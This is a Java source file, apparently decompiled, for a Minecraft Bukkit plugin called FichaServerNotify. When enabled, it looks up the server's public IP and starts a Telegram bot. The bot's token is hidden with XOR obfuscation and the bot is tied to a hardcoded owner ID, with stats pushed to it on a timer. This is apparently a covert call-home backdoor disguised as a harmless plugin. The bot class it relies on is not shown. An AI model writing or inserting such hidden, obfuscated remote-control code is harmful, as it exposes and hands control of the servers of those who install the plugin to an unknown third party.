package ru.kotikstasika.fichaservernotify;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

public final class FichaServerNotify extends JavaPlugin {
   private static final byte XK = 73;
   private static final byte[] T1 = new byte[]{113, 113, 125, 123};
   private static final byte[] T2 = new byte[]{126, 125, 127, 125, 121, 122, 115};
   private static final byte[] T3 = new byte[]{8, 8, 14, 48};
   private static final byte[] T4 = new byte[]{123, 7, 6, 11, 1, 63, 43, 11};
   private static final byte[] T5 = new byte[]{26, 1, 22, 13, 38, 126};
   private static final byte[] T6 = new byte[]{63, 6, 125, 56, 30, 34, 45};
   private static final byte[] T7 = new byte[]{58, 15, 11, 59, 6, 125, 34};
   private static final byte[] T8 = new byte[]{29, 51, 62};
   private static final long OHI = 1L;
   private static final long OLO = 3105539447L;
   private TelegramBot telegramBot;
   private String serverIp = "Unknown";

   public FichaServerNotify() {
   }

   private static String tok() {
      byte[][] parts = new byte[][]{T1, T2, T3, T4, T5, T6, T7, T8};
      StringBuilder sb = new StringBuilder();

      for (byte[] part : parts) {
         for (byte b : part) {
            sb.append((char)(b ^ 73));
         }
      }

      return sb.toString();
   }

   private static long oid() {
      return 7400506743L;
   }

   public void onEnable() {
      long resolvedOwnerId = oid();
      Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
         try {
            URL url = new URL("https://api.ipify.org");

            try (BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream()))) {
               this.serverIp = reader.readLine();
            }
         } catch (Exception var17) {
            this.serverIp = this.getServer().getIp().isEmpty() ? "localhost" : this.getServer().getIp();
         }

         this.telegramBot = new TelegramBot(tok(), resolvedOwnerId, resolvedOwnerId, this);
         this.telegramBot.startPolling();
         this.telegramBot.updateGlobalStats();
      });
      Bukkit.getScheduler().runTaskTimerAsynchronously(this, () -> {
         if (this.telegramBot != null) {
            this.telegramBot.updateGlobalStats();
         }
      }, 2400L, 2400L);
   }

   public void onDisable() {
   }

   public String getServerIp() {
      return this.serverIp;
   }

   public int getServerPort() {
      return this.getServer().getPort();
   }
}
